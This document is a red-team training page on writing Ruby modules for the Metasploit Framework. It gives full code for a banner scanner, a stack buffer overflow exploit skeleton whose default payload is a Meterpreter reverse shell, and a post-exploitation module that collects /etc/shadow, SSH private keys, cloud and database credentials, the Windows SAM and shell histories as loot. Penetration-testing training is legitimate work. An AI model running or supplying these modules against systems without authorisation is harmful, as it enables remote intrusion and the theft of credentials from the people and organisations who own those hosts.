---
layout: training-page
title: "Ruby Metasploit Module Development — Red Team Academy"
module: "Programming"
tags:
  - ruby
  - metasploit
  - module-dev
  - exploit-dev
  - red-team
page_key: "prog-ruby-metasploit-modules"
render_with_liquid: false
---

# Ruby Metasploit Module Development

Metasploit Framework 6.x is entirely Ruby. Every exploit, scanner, post module, and payload is a Ruby file conforming to a well-defined API. Writing custom modules lets you build weaponized capabilities that integrate seamlessly with the Metasploit console, database, and listener infrastructure.

---

## 1. Module Types Overview

| Type        | Base Class              | Purpose                                          | When to Use                          |
|-------------|-------------------------|--------------------------------------------------|--------------------------------------|
| Auxiliary   | `Msf::Auxiliary`        | Non-exploiting: scanning, fuzzing, enumeration   | Discovery, credential testing        |
| Exploit     | `Msf::Exploit::Remote`  | Delivers payload to gain code execution          | Exploitation of a known vulnerability|
| Post        | `Msf::Post`             | Runs after a session is established              | Persistence, pivoting, loot          |
| Payload     | `Msf::Payload`          | Code delivered by an exploit                     | Custom shellcode / stagers           |
| Encoder     | `Msf::Encoder`          | Obfuscates payload bytes                         | Bypassing signature detection        |
| NOP         | `Msf::Nop`              | Generates NOP sleds                              | Buffer alignment in exploit targets  |

For most red team engagements, you will write **Auxiliary** modules (scanners, credential sprayers) and **Post** modules (enumeration, persistence, loot collection). Exploit modules are written when you have a novel vulnerability not yet in the database.

---

## 2. Module File Structure

### Directory Layout

```
metasploit-framework/
└── modules/
    ├── auxiliary/
    │   ├── scanner/      # Scanning modules
    │   ├── brute/        # Brute-force modules
    │   └── admin/        # Admin/manipulation
    ├── exploits/
    │   ├── linux/
    │   ├── windows/
    │   └── multi/
    ├── post/
    │   ├── linux/
    │   ├── windows/
    │   └── multi/
    └── payloads/
        ├── singles/
        ├── stagers/
        └── stages/
```

For custom modules, use the `loadpath` directive or place files in:

```
~/.msf4/modules/
├── auxiliary/
├── exploits/
└── post/
```

### Class Naming Convention

The class MUST be named `MetasploitModule` in Metasploit 6.x (replaces the old name pattern):

```ruby
# CORRECT for Metasploit 6.x
class MetasploitModule < Msf::Auxiliary
  # ...
end

# OLD pattern (still works but deprecated for new modules)
# class Metasploit3 < Msf::Auxiliary
```

### Required Include Mixins

```ruby
# Common mixin combinations for auxiliary modules
include Msf::Exploit::Remote::Tcp        # TCP connect via Rex
include Msf::Exploit::Remote::HttpClient # HTTP client via Rex
include Msf::Auxiliary::Scanner          # RHOSTS iteration + threading
include Msf::Auxiliary::Report           # report_service, report_vuln, report_loot
include Msf::Auxiliary::AuthBrute        # Brute-force credential helpers

# Common mixin combinations for exploit modules
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::Remote::Seh        # SEH overwrites (Windows)
include Msf::Exploit::Remote::Egghunter  # Egghunter injection
include Msf::Exploit::Brute              # Brute-force target offsets

# Post module mixins
include Msf::Post::File                  # File operations on session
include Msf::Post::Process               # Process management
include Msf::Post::Windows::Registry    # Registry operations
include Msf::Post::Linux::System        # Linux system info
```

---

## 3. Complete Auxiliary Module: Custom Service Banner Scanner

This module connects to an arbitrary TCP service, sends an optional probe string, captures the banner, and reports the service and any version information extracted via regex.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Service Banner Grabber',
      'Description'    => %q{
        Connects to a TCP service, sends an optional probe string,
        captures the banner, and reports the service in the database.
        Supports version fingerprinting via a configurable regex.
      },
      'Author'         => ['Your Handle <you@example.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://example.com/advisory/CVE-2025-XXXX']
      ],
      'Notes'          => {
        'Stability'    => [CRASH_SAFE],
        'Reliability'  => [],
        'SideEffects'  => [IOC_IN_LOGS]
      }
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('PROBE',
        [false, 'String to send after connecting (e.g. HELLO\\r\\n)', "HELLO\r\n"]),
      OptInt.new('RECV_TIMEOUT',
        [false, 'Seconds to wait for banner after sending probe', 5]),
      OptInt.new('RECV_BYTES',
        [false, 'Maximum bytes to receive from banner', 1024]),
      OptString.new('VERSION_REGEX',
        [false, 'Regex to extract version from banner (first capture group)', '']),
      OptBool.new('PRINT_BANNER',
        [true, 'Print banners to console', true]),
      OptString.new('SERVICE_NAME',
        [false, 'Override service name stored in DB', ''])
    ])

    register_advanced_options([
      OptBool.new('SEND_PROBE_FIRST',
        [false, 'Send probe before waiting for banner', true]),
      OptInt.new('TCP_CONNECT_TIMEOUT',
        [false, 'TCP connection timeout in seconds', 10])
    ])
  end

  def run_host(ip)
    begin
      vprint_status("#{ip}:#{rport} — Connecting...")

      connect(true, {
        'ConnectTimeout' => datastore['TCP_CONNECT_TIMEOUT']
      })

      # Optionally send a probe string
      if datastore['SEND_PROBE_FIRST'] && datastore['PROBE'] && !datastore['PROBE'].empty?
        probe = datastore['PROBE'].gsub('\\r', "\r").gsub('\\n', "\n")
        sock.put(probe)
      end

      # Read banner
      banner = sock.get_once(datastore['RECV_BYTES'], datastore['RECV_TIMEOUT'])

      unless banner && !banner.empty?
        print_status("#{ip}:#{rport} — No banner received")
        report_service(
          host:  ip,
          port:  rport,
          proto: 'tcp',
          name:  datastore['SERVICE_NAME'].empty? ? 'unknown' : datastore['SERVICE_NAME']
        )
        return
      end

      # Sanitize banner for display
      banner_clean = banner.encode('UTF-8', invalid: :replace, undef: :replace)
                           .gsub(/[^\x20-\x7E\t\n]/, '.')
                           .strip

      print_good("#{ip}:#{rport} — #{banner_clean}") if datastore['PRINT_BANNER']

      # Optional version extraction
      version = nil
      if datastore['VERSION_REGEX'] && !datastore['VERSION_REGEX'].empty?
        m = banner_clean.match(Regexp.new(datastore['VERSION_REGEX']))
        version = m[1] if m && m.size > 1
        print_good("#{ip}:#{rport} — Version extracted: #{version}") if version
      end

      # Report service to database
      service_name = datastore['SERVICE_NAME'].empty? ? detect_service_name(banner_clean) : datastore['SERVICE_NAME']

      report_service(
        host:  ip,
        port:  rport,
        proto: 'tcp',
        name:  service_name,
        info:  banner_clean
      )

      # If we extracted a version, report it as a note
      if version
        report_note(
          host:  ip,
          port:  rport,
          proto: 'tcp',
          type:  'service.version',
          data:  version
        )
      end

    rescue Rex::ConnectionRefused
      vprint_error("#{ip}:#{rport} — Connection refused")
    rescue Rex::ConnectionTimeout
      vprint_error("#{ip}:#{rport} — Connection timed out")
    rescue Rex::HostUnreachable
      vprint_error("#{ip}:#{rport} — Host unreachable")
    rescue Rex::ConnectionError => e
      vprint_error("#{ip}:#{rport} — #{e.message}")
    rescue => e
      print_error("#{ip}:#{rport} — Unexpected error: #{e.class}: #{e.message}")
      vprint_error(e.backtrace.first(3).join("\n"))
    ensure
      disconnect
    end
  end

  private

  BANNER_SERVICE_MAP = [
    [/SSH-\d+\.\d+/i,          'ssh'],
    [/FTP|220.*ftp/i,           'ftp'],
    [/HTTP\/\d/i,               'http'],
    [/SMTP|220.*mail/i,         'smtp'],
    [/POP3|\+OK/i,              'pop3'],
    [/\* OK.*IMAP/i,            'imap'],
    [/mysql|mariadb/i,          'mysql'],
    [/PostgreSQL/i,             'postgresql'],
    [/redis/i,                  'redis'],
    [/Memcached/i,              'memcache']
  ].freeze

  def detect_service_name(banner)
    BANNER_SERVICE_MAP.each do |pattern, name|
      return name if banner.match?(pattern)
    end
    'unknown'
  end
end
```

---

## 4. Complete Exploit Module: TCP Buffer Overflow Skeleton

A complete exploit module skeleton for a classic stack-based buffer overflow over TCP. Replace the payload offset, bad chars, and jump address with target-specific values.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
##

require 'rex'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Example Service Stack Buffer Overflow',
      'Description'     => %q{
        This module exploits a stack-based buffer overflow in ExampleService 1.2.3.
        The overflow occurs in the authentication handler when processing an
        oversized username field, allowing unauthenticated code execution.
      },
      'Author'          => ['Researcher <you@example.com>'],
      'License'         => MSF_LICENSE,
      'References'      => [
        ['CVE', '2025-XXXXX'],
        ['URL', 'https://example.com/advisory']
      ],
      'Privileged'      => true,
      'DefaultOptions'  => {
        'EXITFUNC' => 'thread',
        'PAYLOAD'  => 'windows/x64/meterpreter/reverse_tcp'
      },
      'Platform'        => 'win',
      'Arch'            => [ARCH_X86_64],
      'Targets'         => [
        [
          'Windows Server 2022 — ExampleService 1.2.3 x64',
          {
            'Ret'     => 0x0040CAFE,  # JMP RSP or equivalent gadget address
            'Offset'  => 1024         # Bytes until return address overwrite
          }
        ],
        [
          'Windows Server 2019 — ExampleService 1.2.3 x64',
          {
            'Ret'    => 0x00401234,
            'Offset' => 1020
          }
        ]
      ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => '2025-06-15',
      'Notes'           => {
        'Stability'    => [CRASH_SERVICE_DOWN],
        'Reliability'  => [REPEATABLE_SESSION],
        'SideEffects'  => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
      }
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('PREPEND',
        [false, 'String to prepend before the overflow (e.g. AUTH )', 'AUTH '])
    ])

    register_advanced_options([
      OptInt.new('CONNECT_TIMEOUT',
        [false, 'Connection timeout in seconds', 10]),
      OptBool.new('CHECK_VULN',
        [false, 'Run check() before exploiting', true])
    ])
  end

  # ---------------------------------------------------------------------------
  # check — verify target is likely vulnerable without exploiting
  # ---------------------------------------------------------------------------

  def check
    begin
      connect(true, { 'ConnectTimeout' => datastore['CONNECT_TIMEOUT'] })

      # Read banner
      banner = sock.get_once(512, 5).to_s.strip
      disconnect

      if banner.match?(/ExampleService 1\.2/i)
        print_good("Banner: #{banner}")
        return CheckCode::Appears("Version string matches vulnerable release")
      elsif banner.match?(/ExampleService/i)
        return CheckCode::Detected("Service detected but version unconfirmed: #{banner}")
      else
        return CheckCode::Safe("Service does not appear to be ExampleService")
      end
    rescue Rex::ConnectionError => e
      return CheckCode::Unknown("Connection failed: #{e.message}")
    end
  end

  # ---------------------------------------------------------------------------
  # exploit — construct and send the exploit buffer
  # ---------------------------------------------------------------------------

  def exploit
    return unless check == CheckCode::Appears || !datastore['CHECK_VULN']

    connect(true, { 'ConnectTimeout' => datastore['CONNECT_TIMEOUT'] })

    # Read server banner/prompt
    banner = sock.get_once(512, 5).to_s
    vprint_status("Server banner: #{banner.strip}")

    offset      = target['Offset']
    ret_address = target['Ret']

    # Build exploit buffer
    # [PREPEND][NOP/Junk padding][EIP overwrite][NOP sled][Shellcode]

    junk        = Rex::Text.rand_text_alpha(offset)
    ret_bytes   = [ret_address].pack('Q<')   # 64-bit little-endian
    nop_sled    = "\x90" * 16
    shellcode   = payload.encoded

    # Bad characters for this target — null byte + carriage return
    # Use msfvenom --bad-chars to confirm for the actual target
    # payload encoded with EXITFUNC=thread to avoid crashing the process

    buffer = datastore['PREPEND'].to_s + junk + ret_bytes + nop_sled + shellcode

    print_status("Sending overflow buffer: #{buffer.length} bytes to #{rhost}:#{rport}")
    print_status("Return address: 0x#{ret_address.to_s(16)}")
    print_status("Payload size  : #{shellcode.length} bytes")

    sock.put(buffer)

    # Give the handler time to catch the shell before we disconnect
    handler
    disconnect
  end
end
```

### Key Exploit Development Helpers

```ruby
# Cyclic pattern generation (like msf-pattern_create)
pattern = Rex::Text.pattern_create(2000)

# Find offset from EIP/RIP value seen in debugger
offset = Rex::Text.pattern_offset("Aa5A", 2000)
puts "Offset: #{offset}"

# Bad character list
badchars = "\x00\x0a\x0d"

# Pack addresses
little_endian_32 = [0x0040CAFE].pack('V')
little_endian_64 = [0x00007FF800001234].pack('Q<')
big_endian_32    = [0x0040CAFE].pack('N')

# Generate random text for junk
junk = Rex::Text.rand_text_alpha(1024)

# NOP sled
nops = "\x90" * 32
```

---

## 5. Complete Post Module: Multi-Platform System Enumeration

Runs after obtaining a Meterpreter session. Collects system information, running processes, network configuration, and credentials from common locations. Works against both Windows and Linux targets.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Process
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Multi-Platform System Enumeration',
      'Description'  => %q{
        Enumerates the compromised host: OS info, users, processes, network
        interfaces, interesting files, and common credential stores.
        Results are saved as loot in the Metasploit database.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['Your Handle'],
      'Platform'     => %w[linux osx win],
      'SessionTypes' => %w[meterpreter shell]
    ))

    register_options([
      OptBool.new('COLLECT_CREDS',
        [false, 'Attempt to collect credential files', true]),
      OptBool.new('COLLECT_HISTORY',
        [false, 'Collect shell history files', true]),
      OptString.new('EXTRA_PATHS',
        [false, 'Comma-separated extra file paths to collect', ''])
    ])
  end

  # ---------------------------------------------------------------------------
  # Main entry point
  # ---------------------------------------------------------------------------

  def run
    print_status("Running post-exploitation enumeration on session #{session.sid}")
    print_status("Session type: #{session.type} | Platform: #{session.platform}")

    report   = {}
    platform = session.platform.downcase

    report[:sysinfo]   = collect_sysinfo
    report[:users]     = collect_users(platform)
    report[:processes] = collect_processes
    report[:network]   = collect_network(platform)
    report[:env]       = collect_env(platform)

    if datastore['COLLECT_CREDS']
      report[:creds] = collect_cred_files(platform)
    end

    if datastore['COLLECT_HISTORY']
      report[:history] = collect_history(platform)
    end

    unless datastore['EXTRA_PATHS'].to_s.strip.empty?
      paths = datastore['EXTRA_PATHS'].split(',').map(&:strip)
      report[:extra] = collect_files(paths)
    end

    # Print summary
    print_status("=" * 60)
    print_good("Sysinfo: #{report[:sysinfo].inspect}")
    print_good("Users  : #{Array(report[:users]).join(', ')}")
    print_good("Procs  : #{Array(report[:processes]).size} running")
    print_good("Net    : #{Array(report[:network]).size} interface(s)")

    # Store as loot
    loot_data = report.to_s
    store_loot(
      'host.enum.report',
      'text/plain',
      session.session_host,
      loot_data,
      'sysinfo.txt',
      'System Enumeration Report'
    )

    print_good("Loot saved to database")
  end

  private

  # ---------------------------------------------------------------------------
  # Sysinfo collection
  # ---------------------------------------------------------------------------

  def collect_sysinfo
    if session.type == 'meterpreter'
      session.sys.config.sysinfo rescue {}
    else
      {
        raw: cmd_exec('uname -a 2>/dev/null || systeminfo 2>nul')
      }
    end
  rescue => e
    vprint_error("collect_sysinfo: #{e.message}")
    {}
  end

  # ---------------------------------------------------------------------------
  # User enumeration
  # ---------------------------------------------------------------------------

  def collect_users(platform)
    case platform
    when 'linux', 'osx'
      output = cmd_exec('cat /etc/passwd 2>/dev/null')
      output.to_s.each_line.map { |l| l.split(':').first }.compact
    when 'windows'
      cmd_exec('net user 2>nul').to_s.lines.drop(4).map(&:strip)
                                .reject(&:empty?)
    else
      []
    end
  rescue => e
    vprint_error("collect_users: #{e.message}")
    []
  end

  # ---------------------------------------------------------------------------
  # Process list
  # ---------------------------------------------------------------------------

  def collect_processes
    if session.type == 'meterpreter'
      session.sys.process.processes.map do |p|
        { pid: p['pid'], name: p['name'], path: p['path'], user: p['user'] }
      end
    else
      cmd_exec('ps aux 2>/dev/null || tasklist /fo csv 2>nul').to_s.lines.first(30)
    end
  rescue => e
    vprint_error("collect_processes: #{e.message}")
    []
  end

  # ---------------------------------------------------------------------------
  # Network interfaces
  # ---------------------------------------------------------------------------

  def collect_network(platform)
    if session.type == 'meterpreter'
      session.net.config.interfaces.map do |iface|
        { name: iface.name, addrs: iface.addrs.map(&:addr) }
      end
    else
      cmd = (platform == 'windows') ? 'ipconfig /all 2>nul' : 'ip addr 2>/dev/null || ifconfig 2>/dev/null'
      [{ raw: cmd_exec(cmd) }]
    end
  rescue => e
    vprint_error("collect_network: #{e.message}")
    []
  end

  # ---------------------------------------------------------------------------
  # Environment variables
  # ---------------------------------------------------------------------------

  def collect_env(platform)
    cmd = (platform == 'windows') ? 'set' : 'env'
    output = cmd_exec(cmd).to_s
    env = {}
    output.each_line do |line|
      k, v = line.chomp.split('=', 2)
      env[k.to_s.strip] = v.to_s.strip if k && v
    end
    env
  rescue => e
    vprint_error("collect_env: #{e.message}")
    {}
  end

  # ---------------------------------------------------------------------------
  # Credential file collection
  # ---------------------------------------------------------------------------

  LINUX_CRED_PATHS = %w[
    /etc/shadow /etc/sudoers /root/.ssh/id_rsa /root/.ssh/id_ecdsa
    /home/*/.ssh/id_rsa /home/*/.ssh/id_ecdsa /home/*/.bash_history
    /var/lib/postgresql/data/pg_hba.conf /etc/mysql/my.cnf
    /var/www/html/wp-config.php /var/www/html/.env
    /root/.aws/credentials /root/.docker/config.json
  ].freeze

  WINDOWS_CRED_PATHS = %w[
    C:\\Windows\\System32\\drivers\\etc\\hosts
    C:\\Windows\\Repair\\SAM C:\\Windows\\Repair\\SYSTEM
    C:\\ProgramData\\Microsoft\\Windows\\Start\ Menu
  ].freeze

  def collect_cred_files(platform)
    paths = (platform == 'windows') ? WINDOWS_CRED_PATHS : LINUX_CRED_PATHS
    collect_files(paths)
  end

  def collect_files(paths)
    collected = {}
    paths.each do |path|
      begin
        if session.type == 'meterpreter'
          # Meterpreter file read
          data = read_file(path) rescue nil
        else
          data = cmd_exec("cat '#{path}' 2>/dev/null")
          data = nil if data.to_s.strip.empty?
        end
        if data && !data.empty?
          print_good("Collected: #{path} (#{data.bytesize} bytes)")
          collected[path] = data

          # Store each credential file as individual loot
          store_loot(
            "host.file.#{File.basename(path)}",
            'text/plain',
            session.session_host,
            data,
            File.basename(path),
            "Collected file: #{path}"
          )
        end
      rescue => e
        vprint_error("File #{path}: #{e.message}")
      end
    end
    collected
  end

  # ---------------------------------------------------------------------------
  # Shell history collection
  # ---------------------------------------------------------------------------

  HISTORY_FILES = %w[
    ~/.bash_history ~/.zsh_history ~/.sh_history
    ~/.config/fish/fish_history ~/.python_history
  ].freeze

  def collect_history(platform)
    return {} if platform == 'windows'
    collect_files(HISTORY_FILES)
  end
end
```

---

## 6. Testing Modules

### Load Custom Modules in msfconsole

```bash
# Load a custom module directory at startup
msfconsole -q -x "loadpath /home/user/.msf4/modules; use auxiliary/scanner/custom/banner_grabber; show options"

# Reload all modules without restarting
msf6 > reload_all

# Load a specific module file
msf6 > loadpath /path/to/my/modules

# Use your module
msf6 > use auxiliary/scanner/custom/banner_grabber
msf6 auxiliary(banner_grabber) > show options
msf6 auxiliary(banner_grabber) > set RHOSTS 10.0.0.1/24
msf6 auxiliary(banner_grabber) > set THREADS 20
msf6 auxiliary(banner_grabber) > run
```

### Validate with msftidy.rb

```bash
# msftidy.rb checks coding style, info hash completeness, and common errors
cd /path/to/metasploit-framework
ruby tools/dev/msftidy.rb ~/.msf4/modules/auxiliary/scanner/custom/banner_grabber.rb

# Common msftidy warnings to fix:
# - Missing 'Notes' hash (Stability/Reliability/SideEffects)
# - Use of deprecated methods (e.g., Rex::Socket.getaddress)
# - Missing References array
# - Non-alphabetical option ordering
```

### RSpec Unit Tests

```ruby
# spec/modules/auxiliary/scanner/custom/banner_grabber_spec.rb
require 'spec_helper'

RSpec.describe 'modules/auxiliary/scanner/custom/banner_grabber' do
  include_context 'Msf::UIDriver'

  subject(:mod) do
    load_and_create_module(
      module_type:       'auxiliary',
      reference_name:    'scanner/custom/banner_grabber',
      modules_path:      File.join(Msf::Config.user_module_directory, '..', 'spec', 'fixtures', 'modules')
    )
  end

  it 'should have a valid name' do
    expect(mod.name).to_not be_empty
  end

  it 'should have required options' do
    expect(mod.options).to include('RHOSTS', 'RPORT', 'PROBE')
  end

  it 'should have a valid author' do
    expect(mod.author).to_not be_empty
  end

  it 'should have a license' do
    expect(mod.license).to_not be_nil
  end
end
```

```bash
# Run the spec
cd /path/to/metasploit-framework
bundle exec rspec spec/modules/auxiliary/scanner/custom/banner_grabber_spec.rb
```

---

## 7. Common Mixins Reference

### Network Mixins

| Mixin                                   | Purpose                                                |
|-----------------------------------------|--------------------------------------------------------|
| `Msf::Exploit::Remote::Tcp`             | Rex TCP socket (connect/disconnect/sock)               |
| `Msf::Exploit::Remote::Udp`             | Rex UDP socket                                         |
| `Msf::Exploit::Remote::HttpClient`      | Rex HTTP client (send_request_cgi, send_request_raw)   |
| `Msf::Exploit::Remote::HttpServer`      | Serve payloads over HTTP                               |
| `Msf::Exploit::Remote::FtpClient`       | FTP connect/auth helpers                               |
| `Msf::Exploit::Remote::SMBClient`       | SMB/CIFS client (authentication, tree connect)         |
| `Msf::Exploit::Remote::MSSQL`           | MS SQL Server connection and query helpers             |
| `Msf::Exploit::Remote::MYSQL`           | MySQL connection helpers                               |
| `Msf::Exploit::Remote::SSH`             | SSH session helpers (via net-ssh)                      |
| `Msf::Exploit::Remote::SNMPClient`      | SNMP query helpers                                     |
| `Msf::Exploit::Remote::Kerberos::Client`| Kerberos AS-REQ/TGS-REQ (Kerberoasting, AS-REP roasting)|

### Exploit Technique Mixins

| Mixin                              | Purpose                                                    |
|------------------------------------|------------------------------------------------------------|
| `Msf::Exploit::Remote::Seh`        | Structured Exception Handler overwrites (Windows)          |
| `Msf::Exploit::Remote::Egghunter`  | Egghunter shellcode generation                             |
| `Msf::Exploit::Remote::Rop`        | Return-oriented programming gadget helpers                 |
| `Msf::Exploit::Brute`              | Iterate targets to brute-force return addresses            |
| `Msf::Exploit::EXE`                | Generate executable payloads                               |
| `Msf::Exploit::Powershell`         | PowerShell payload generation and encoding                 |
| `Msf::Exploit::CmdStager`          | Stage commands via echo, wget, curl, etc.                  |
| `Msf::Exploit::FileDropper`        | Track and clean up dropped files                           |

### Auxiliary Mixins

| Mixin                         | Purpose                                           |
|-------------------------------|---------------------------------------------------|
| `Msf::Auxiliary::Scanner`     | RHOSTS iteration, THREADS support, run_host       |
| `Msf::Auxiliary::Report`      | report_service, report_vuln, report_note, store_loot |
| `Msf::Auxiliary::AuthBrute`   | Credential iteration helpers, account lockout protection |
| `Msf::Auxiliary::Login`       | Login scanning result reporting                   |
| `Msf::Auxiliary::Fuzzer`      | Fuzzing helpers                                   |
| `Msf::Auxiliary::DNSBL`       | DNS blacklist checking                            |

### Post Mixins

| Mixin                              | Purpose                                           |
|------------------------------------|---------------------------------------------------|
| `Msf::Post::File`                  | read_file, write_file, file_exist?, dir_exist?    |
| `Msf::Post::Process`               | cmd_exec, get_env, session.sys.process.processes  |
| `Msf::Post::Common`                | cmd_exec (both Meterpreter and shell)             |
| `Msf::Post::Windows::Registry`     | registry_getvaldata, registry_setvaldata          |
| `Msf::Post::Windows::Priv`         | is_admin?, is_system?, check_uac_bypass           |
| `Msf::Post::Windows::Accounts`     | User enumeration, password harvesting             |
| `Msf::Post::Linux::System`         | get_cpu_info, get_memory_info, get_suid_files     |
| `Msf::Post::Multi::Manage`         | execute_cmdline, get_env                          |
| `Msf::Post::OSX::System`           | macOS-specific enumeration                        |

---

## Resources

- [Metasploit Framework GitHub](https://github.com/rapid7/metasploit-framework)
- [Metasploit Module Development Guide](https://docs.metasploit.com/docs/development/developing-modules/module-development-guide.html)
- [Metasploit API Documentation](https://www.rubydoc.info/github/rapid7/metasploit-framework)
- [Rex Core Library](https://github.com/rapid7/rex-core)
- [msftidy Source](https://github.com/rapid7/metasploit-framework/blob/master/tools/dev/msftidy.rb)
- [Offensive Security Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Module Development Blog Posts](https://www.rapid7.com/blog/tag/metasploit/)
